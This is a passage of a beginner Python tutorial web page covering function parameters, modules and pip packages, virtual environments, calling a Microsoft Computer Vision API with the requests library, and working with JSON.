class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># If you need to change something you only have to change it in one place!</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name</span>):</span><br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">return</span> initial<br><br><br><span class="hljs-comment"># Functions that return values allow clever code, but you might trade readability for less code</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name</span>):</span><br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + get_initial(first_name) + get_initial(last_name))<br><br></code></pre></td></tr></table></figure><h4 id="4ï¼‰Function-parameters"><a href="#4ï¼‰Function-parameters" class="headerlink" title="4ï¼‰Function parameters"></a>4ï¼‰Function parameters</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Functions can accept multiple parameters</span><br><span class="hljs-comment"># Pass the parameters in the same order they are listed in the function declaration</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name, force_uppercase</span>):</span><br>    <span class="hljs-keyword">if</span> force_uppercase:<br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">else</span>:<br>        initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(first_name, <span class="hljs-literal">True</span>)<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = get_initial(last_name, <span class="hljs-literal">False</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># You can specify a default value for a parameter</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name, force_uppercase=<span class="hljs-literal">True</span></span>):</span><br>    <span class="hljs-keyword">if</span> force_uppercase:<br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">else</span>:<br>        initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(first_name)<br><br>last_name = <span class="hljs-string">&#x27;ibach&#x27;</span><br>last_name_initial = get_initial(last_name, <span class="hljs-literal">False</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials are: &#x27;</span> + first_name_initial + last_name_initial)<br><br><br><span class="hljs-comment"># You can also assign the values to parameters by name when you call the function</span><br><span class="hljs-comment"># When you use named parameters, you can specify parameters in any order</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_initial</span>(<span class="hljs-params">name, force_uppercase</span>):</span><br>    <span class="hljs-keyword">if</span> force_uppercase:<br>    initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>].upper()<br>    <span class="hljs-keyword">else</span>:<br>        initial = name[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> initial<br><br>first_name = <span class="hljs-string">&#x27;susan&#x27;</span><br>first_name_initial = get_initial(force_uppercase=<span class="hljs-literal">True</span>, name=first_name)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your initials is: &#x27;</span> + first_name_initial)<br><br></code></pre></td></tr></table></figure><h3 id="11ã€Modules-and-packages"><a href="#11ã€Modules-and-packages" class="headerlink" title="11ã€Modules and packages"></a>11ã€Modules and packages</h3><h4 id="1ï¼‰Modules"><a href="#1ï¼‰Modules" class="headerlink" title="1ï¼‰Modules"></a>1ï¼‰Modules</h4><ul><li><p><strong>Whatâ€™s a module?</strong></p><ul><li>A python file with functions, classes and other components</li></ul></li><li><p><strong>Why use module?</strong></p><ul><li>Break code down into reusable structures</li></ul></li></ul><p><strong>Creating a module</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># helpers.py</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">message, is_warning=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">if</span> is_warning:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Warning!!&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure><p><strong>Import a module</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import module as namespace</span><br><span class="hljs-keyword">import</span> helpers<br>helpers.display(<span class="hljs-string">&#x27;Not a warning&#x27;</span>)<br><br><span class="hljs-comment"># import all into current namespace</span><br><span class="hljs-keyword">from</span> helpers <span class="hljs-keyword">import</span> *<br>display(<span class="hljs-string">&#x27;Not a warning&#x27;</span>)<br><br><span class="hljs-comment"># import specific items into current namespace</span><br><span class="hljs-keyword">from</span> helpers <span class="hljs-keyword">import</span> display<br>display(<span class="hljs-string">&#x27;Not a warning&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="2ï¼‰Packages"><a href="#2ï¼‰Packages" class="headerlink" title="2ï¼‰Packages"></a>2ï¼‰Packages</h4><ul><li><strong>What are packages?</strong><ul><li>Published collections of modules </li></ul></li><li>How do I find packages?<ul><li><a href="https://pypi.org/">Python Package Index</a></li><li>Internet search</li></ul></li></ul><p><strong>Installing packages</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Install an individual package</span><br>pip install colorama<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Install from a list of packages</span><br>pip install -r requirements.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> requirements.txt</span><br>colorama<br></code></pre></td></tr></table></figure><p><code>The best code in the world is the code that&#39;s already written</code></p><h4 id="3ï¼‰Virtual-environments"><a href="#3ï¼‰Virtual-environments" class="headerlink" title="3ï¼‰Virtual environments"></a>3ï¼‰Virtual environments</h4><ul><li><p><strong>By default, packages are installed globally</strong></p><ul><li>Version management becomes a challenge</li></ul></li><li><p><strong>Virtual environments can be used to contain and manage package collections</strong></p><ul><li>Really just a folder behind the scenes with all your packages</li></ul></li></ul><p><strong>Creating a virtual environments</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Install virtual environments</span><br>pip install virtualenv<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Windows systems</span><br>python -m venv &lt;folder_name&gt;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> OSX/Linux(bash)</span><br>virtualenv &lt;folder_name&gt;<br></code></pre></td></tr></table></figure><p><strong>Using virtual environments</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Windows systems</span><br><span class="hljs-meta">#</span><span class="bash"> cmd.exe</span><br>&lt;folder_name&gt;\Scripts\Activate.bat<br><span class="hljs-meta">#</span><span class="bash"> Powershell</span><br>&lt;folder_name&gt;\Scripts\Activate.ps1<br><span class="hljs-meta">#</span><span class="bash"> bash shell</span><br>. ./&lt;folder_name&gt;/Scripts/activate<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> OSX/Linux(bash)</span><br>&lt;folder_name&gt;/bin/activate<br></code></pre></td></tr></table></figure><p><strong>Installing packages in a virtual environment</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Install an individual package</span><br>pip install colorama<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Install from a list of packages</span><br>pip install -r requirements.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> requirements.txt</span><br>colorama<br></code></pre></td></tr></table></figure><p><strong>Importing packages</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import package as namespace</span><br><span class="hljs-keyword">import</span> colorama<br>colorama.init() <span class="hljs-comment"># Call required by colorama</span><br><span class="hljs-built_in">print</span>(colorama.Fore.RED + <span class="hljs-string">&#x27;This is red&#x27;</span>)<br><br><span class="hljs-comment"># import all components from module</span><br><span class="hljs-keyword">from</span> colorama <span class="hljs-keyword">import</span> *<br>init() <span class="hljs-comment"># Call required by colorama</span><br><span class="hljs-built_in">print</span>(Fore.BLUE + <span class="hljs-string">&#x27;This is blue&#x27;</span>)<br><br><span class="hljs-comment"># import specific components from module</span><br><span class="hljs-keyword">from</span> colorama <span class="hljs-keyword">import</span> init, Fore<br>init() <span class="hljs-comment"># Call required by colorama</span><br><span class="hljs-built_in">print</span>(Fore.GREEN + <span class="hljs-string">&#x27;This is green&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="12ã€Calling-an-API"><a href="#12ã€Calling-an-API" class="headerlink" title="12ã€Calling an API"></a>12ã€Calling an API</h3><p><strong>1ï¼‰What is a web service?</strong></p><p>When a developer wants to share the functionality of a function but not the actual code in the program, they can place the function on a web server.</p><p>A programmer with the address of that function on the web server and the required permissions can call the function</p><p>This is called a web service</p><p><strong>2ï¼‰What is an API?</strong></p><p>You canâ€™t call a function unless you know the function name and the required parameters </p><p>When you create a web service you create an Application Programming Interface (API) </p><p>The API defines the function names and parameters so others know how to call your function.</p><p><strong>3ï¼‰Keys allow me to track which users have permission to use my web service</strong></p><p>A developer signs up on my web site, or buys a license for my software and is provided a unique key</p><p>When the developer calls my web service they provide their unique key and I am able to verify the key has been approved for calls to my web service</p><p><strong>4ï¼‰There is a standard for sending messages across the web</strong></p><p>Hypertext Transfer Protocol (HTTP) is a standard protocol for sending messages across the web</p><ul><li><p>GET</p><ul><li>Pass values in query string only</li><li>Special characters must be â€œescapedâ€</li><li>Limited amount of data</li></ul></li><li><p>POST</p><ul><li>Pass values in query string <strong>and</strong> body</li><li>No need to escape special characters if passed in body</li><li>Can pass large amounts of data, including images, in body</li></ul></li></ul><p><strong>5ï¼‰The requests library simplifies HTTP calls from Python code</strong></p><p>requests.post(address, http_headers, function_parameters, message_body)</p><ul><li><p>address: request URL(contoso/analyze)</p></li><li><p>http_headers: request headers(content-type, API key)</p></li><li>function_parameters: request parameters(visualfeatures, details, language)</li><li>message_body: request body(image file)</li></ul><p><strong>6ï¼‰Learning how to call APIs unlocks functionality from developers and software companies around the world API</strong> </p><p>parameters and keys requirements will vary </p><p>Refer to product and API documentation to learn how to call a specific API</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># This code will show you how to call the Computer Vision API from Python</span><br><span class="hljs-comment"># You can find documentation on the Computer Vision Analyze Image method here</span><br><span class="hljs-comment"># https://westus.dev.cognitive.microsoft.com/docs/services/5adf991815e1060e6355ad44/operations/56f91f2e778daf14a499e1fa</span><br><br><span class="hljs-comment"># Use the requests library to simplify making a REST API call from Python </span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># We will need the json library to read the data passed back by the web service</span><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># You need to update the SUBSCRIPTION_KEY to they key for your Computer Vision Service</span><br>SUBSCRIPTION_KEY = <span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><br><span class="hljs-comment"># You need to update the vision_service_address to the address of your Computer Vision Service</span><br>vision_service_address = <span class="hljs-string">&quot;https://canadacentral.api.cognitive.microsoft.com/vision/v2.0/&quot;</span><br><br><span class="hljs-comment"># Add the name of the function you want to call to the address</span><br>address = vision_service_address + <span class="hljs-string">&quot;analyze&quot;</span><br><br><span class="hljs-comment"># According to the documentation for the analyze image function </span><br><span class="hljs-comment"># There are three optional parameters: language, details &amp; visualFeatures</span><br>parameters  = &#123;<span class="hljs-string">&#x27;visualFeatures&#x27;</span>:<span class="hljs-string">&#x27;Description,Color&#x27;</span>,<br>               <span class="hljs-string">&#x27;language&#x27;</span>:<span class="hljs-string">&#x27;en&#x27;</span>&#125;<br><br><span class="hljs-comment"># Open the image file to get a file object containing the image to analyze</span><br>image_path = <span class="hljs-string">&quot;./TestImages/PolarBear.jpg&quot;</span><br>image_data = <span class="hljs-built_in">open</span>(image_path, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br><span class="hljs-comment"># According to the documentation for the analyze image function</span><br><span class="hljs-comment"># we need to specify the subscription key and the content type</span><br><span class="hljs-comment"># in the HTTP header. Content-Type is application/octet-stream when you pass in a image directly</span><br>headers    = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>,<br>              <span class="hljs-string">&#x27;Ocp-Apim-Subscription-Key&#x27;</span>: SUBSCRIPTION_KEY&#125;<br><br><span class="hljs-comment"># According to the documentation for the analyze image function</span><br><span class="hljs-comment"># we use HTTP POST to call this function</span><br>response = requests.post(address, headers=headers, params=parameters, data=image_data)<br><br><span class="hljs-comment"># Raise an exception if the call returns an error code</span><br>response.raise_for_status()<br><br><span class="hljs-comment"># Display the JSON results returned</span><br>results = response.json()<br><span class="hljs-built_in">print</span>(json.dumps(results))<br><br></code></pre></td></tr></table></figure><h3 id="13ã€JSON"><a href="#13ã€JSON" class="headerlink" title="13ã€JSON"></a>13ã€JSON</h3><p><strong>Many web services return data as JSON</strong></p><p>JSON is a standard data format that can be intimidating at first glance</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"># results<br>&#123;<span class="hljs-attr">&quot;color&quot;</span>: &#123;<span class="hljs-attr">&quot;dominantColorForeground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <span class="hljs-attr">&quot;dominantColorBackground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <span class="hljs-attr">&quot;dominantColors&quot;</span>: [<span class="hljs-string">&quot;White&quot;</span>], <span class="hljs-attr">&quot;accentColor&quot;</span>: <span class="hljs-string">&quot;595144&quot;</span>, <span class="hljs-attr">&quot;isBwImg&quot;</span>: <span class="hljs-literal">false</span>&#125;, <span class="hljs-attr">&quot;description&quot;</span>: &#123;<span class="hljs-attr">&quot;tags&quot;</span>: [<span class="hljs-string">&quot;bear&quot;</span>, <span class="hljs-string">&quot;polar&quot;</span>, <span class="hljs-string">&quot;animal&quot;</span>, <span class="hljs-string">&quot;mammal&quot;</span>, <span class="hljs-string">&quot;outdoor&quot;</span>, <span class="hljs-string">&quot;water&quot;</span>, <span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;large&quot;</span>, <span class="hljs-string">&quot;walking&quot;</span>, <span class="hljs-string">&quot;snow&quot;</span>, <span class="hljs-string">&quot;standing&quot;</span>], <span class="hljs-attr">&quot;captions&quot;</span>: [&#123;<span class="hljs-attr">&quot;text&quot;</span>: <span class="hljs-string">&quot;a large white polar bear walking in the water&quot;</span>, <span class="hljs-attr">&quot;confidence&quot;</span>: <span class="hljs-number">0.7419737378283093</span>&#125;]&#125;, <span class="hljs-attr">&quot;requestId&quot;</span>: <span class="hljs-string">&quot;33290a37-ad67-42af-b647-c5a236ecd202&quot;</span>, <span class="hljs-attr">&quot;metadata&quot;</span>: &#123;<span class="hljs-attr">&quot;width&quot;</span>: <span class="hljs-number">220</span>, <span class="hljs-attr">&quot;height&quot;</span>: <span class="hljs-number">221</span>, <span class="hljs-attr">&quot;format&quot;</span>: <span class="hljs-string">&quot;Jpeg&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><strong>Using a linting tool to format JSON makes it easier to read</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;color&quot;</span>:<br>           &#123;<span class="hljs-attr">&quot;dominantColorForeground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>,<br>            <span class="hljs-attr">&quot;dominantColorBackground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <br>            <span class="hljs-attr">&quot;dominantColors&quot;</span>: [<span class="hljs-string">&quot;White&quot;</span>], <br>            <span class="hljs-attr">&quot;accentColor&quot;</span>: <span class="hljs-string">&quot;595144&quot;</span>, <br>            <span class="hljs-attr">&quot;isBwImg&quot;</span>: <span class="hljs-literal">false</span>, <br>            <span class="hljs-attr">&quot;isBWImg&quot;</span>: <span class="hljs-literal">false</span>&#125;,<br>   <span class="hljs-attr">&quot;description&quot;</span>: <br>            &#123;<span class="hljs-attr">&quot;tags&quot;</span>: <br>      [<span class="hljs-string">&quot;bear&quot;</span>, <span class="hljs-string">&quot;polar&quot;</span>, <span class="hljs-string">&quot;animal&quot;</span>, <span class="hljs-string">&quot;mammal&quot;</span>, <span class="hljs-string">&quot;outdoor&quot;</span>, <span class="hljs-string">&quot;water&quot;</span>, <span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;large&quot;</span>, <span class="hljs-string">&quot;walking&quot;</span>, <span class="hljs-string">&quot;snow&quot;</span>, <span class="hljs-string">&quot;standing&quot;</span>], <br>              <span class="hljs-attr">&quot;captions&quot;</span>: <br>                     [&#123;<span class="hljs-attr">&quot;text&quot;</span>: <span class="hljs-string">&quot;a large white polar bear walking in the water&quot;</span>,<br>        <span class="hljs-attr">&quot;confidence&quot;</span>: <span class="hljs-number">0.7419737378283093</span>&#125;]<br>             &#125;,<br>  <span class="hljs-attr">&quot;requestId&quot;</span>: <span class="hljs-string">&quot;33290a37-ad67-42af-b647-c5a236ecd202&quot;</span><br>  &#125;<br><br></code></pre></td></tr></table></figure><p><strong>JSON contains key pairs</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// &quot;key&quot;:&quot;value&quot;</span><br>&#123;<span class="hljs-attr">&quot;requestId&quot;</span>: <span class="hljs-string">&quot;33290a37-ad67-42af-b647-c5a236ecd202&quot;</span>&#125;<br><br><span class="hljs-comment">// &#123;&quot;key&quot;:&#123;&quot;subkey0&quot;:&quot;subvalue0&quot;,&quot;subkey1&quot;:&quot;subvalue1&quot;, â€¦&#125;</span><br>&#123;<span class="hljs-attr">&quot;color&quot;</span>:<br> &#123;<span class="hljs-attr">&quot;dominantColorForeground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>,<br>  <span class="hljs-attr">&quot;dominantColorBackground&quot;</span>: <span class="hljs-string">&quot;White&quot;</span>, <br>  <span class="hljs-attr">&quot;dominantColors&quot;</span>: [<span class="hljs-string">&quot;White&quot;</span>], <br>  <span class="hljs-attr">&quot;accentColor&quot;</span>: <span class="hljs-string">&quot;595144&quot;</span>, <br>  <span class="hljs-attr">&quot;isBWImg&quot;</span>: <span class="hljs-literal">false</span>&#125;<br>&#125;<br><br><span class="hljs-comment">// &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, â€¦]&#125;</span><br>&#123;<span class="hljs-attr">&quot;tags&quot;</span>: [<span class="hljs-string">&quot;bear&quot;</span>, <span class="hljs-string">&quot;polar&quot;</span>, <span class="hljs-string">&quot;animal&quot;</span>, <span class="hljs-string">&quot;mammal&quot;</span>, <span class="hljs-string">&quot;outdoor&quot;</span>, <span class="hljs-string">&quot;water&quot;</span>, <span class="hljs-string">&quot;white&quot;</span>, <span class="hljs-string">&quot;large&quot;</span>, <span class="hljs-string">&quot;walking&quot;</span>, <span class="hljs-string">&quot;snow&quot;</span>, <span class="hljs-string">&quot;standing&quot;</span>]&#125;<br><br></code></pre></td></tr></table></figure><p><strong>Reading JSON</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># To retrieve the value from a &quot;key&quot;:&quot;value&quot; request the key name</span><br><span class="hljs-built_in">print</span> (results[<span class="hljs-string">&#x27;requestId&#x27;</span>])<br><br><span class="hljs-comment"># To request a value from a &#123;&quot;key&quot;:&#123;&quot;subkey0&quot;:&quot;subvalue0&quot;,&quot;subkey1&quot;:&quot;subvalue1&quot;,â€¦&#125; specify the key name and the subkey name</span><br><span class="hljs-built_in">print</span>(results[<span class="hljs-string">&#x27;color&#x27;</span>][<span class="hljs-string">&#x27;dominantColorBackground&#x27;</span>])<br><br><span class="hljs-comment"># To retrieve a value from a &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, â€¦]&#125; specify the keyname and index position of the value to retrieve</span><br><span class="hljs-built_in">print</span>(results[<span class="hljs-string">&#x27;description&#x27;</span>][<span class="hljs-string">&#x27;tags&#x27;</span>][<span class="hljs-number">0</span>])<br><br><span class="hljs-comment"># Use a loop to retrieve all values from a &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, â€¦]&#125;</span><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> results[<span class="hljs-string">&#x27;description&#x27;</span>][<span class="hljs-string">&#x27;tags&#x27;</span>]:<br>    <span class="hljs-built_in">print</span>(item)<br><br></code></pre></td></tr></table></figure><p><strong>Creating JSON</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># You can create &quot;key&quot;:&quot;value&quot; JSON objects from a dictionary</span><br><span class="hljs-comment"># Create a dictionary object</span><br>person_dict = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;last&#x27;</span>:<span class="hljs-string">&#x27;Harrison&#x27;</span>&#125;<br><span class="hljs-comment"># Add additional key pairs as needed to dictionary</span><br>person_dict[<span class="hljs-string">&#x27;City&#x27;</span>]=<span class="hljs-string">&#x27;Seattle&#x27;</span><br><br><span class="hljs-comment"># Convert dictionary to JSON object</span><br>person_json = json.dumps(person_dict)<br><span class="hljs-built_in">print</span>(person_json)<br><br><br><span class="hljs-comment"># Nest dictionaries to create JSON in the format &#123;&quot;key&quot;:&#123;&quot;subkey0&quot;:&quot;subvalue0&quot;,&quot;subkey1&quot;:&quot;subvalue1&quot;,â€¦&#125;</span><br>person_dict = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;last&#x27;</span>:<span class="hljs-string">&#x27;Harrison&#x27;</span>&#125;<br><br><span class="hljs-comment"># Create staff dictionary which assigns a person to a role</span><br>staff_dict =&#123;&#125;<br>staff_dict[<span class="hljs-string">&#x27;Program Manager&#x27;</span>]=person_dict<br><br><span class="hljs-comment"># Convert dictionary to JSON object</span><br>staff_json = json.dumps(staff_dict)<br><span class="hljs-comment"># Print JSON object</span><br><span class="hljs-built_in">print</span>(staff_json)<br>                                                <br>                                                <br><span class="hljs-comment"># Add lists to the dictionary to create JSON in the format &#123;&quot;key&quot;:[listvalue0, listvalue1, listvalue2, â€¦]&#125;</span><br>person_dict = &#123;<span class="hljs-string">&#x27;first&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;last&#x27;</span>:<span class="hljs-string">&#x27;Harrison&#x27;</span>&#125;<br><br><span class="hljs-comment"># Create a list object of programming languages</span><br>languages_list = [<span class="hljs-string">&#x27;CSharp&#x27;</span>,<span class="hljs-string">&#x27;Python&#x27;</span>,<span class="hljs-string">&#x27;JavaScript&#x27;</span> ]<br><span class="hljs-comment"># Add list to dictionary</span><br>person_dict[<span class="hljs-string">&#x27;languages&#x27;</span>]= languages_list<br><br><span class="hljs-comment"># Convert dictionary to 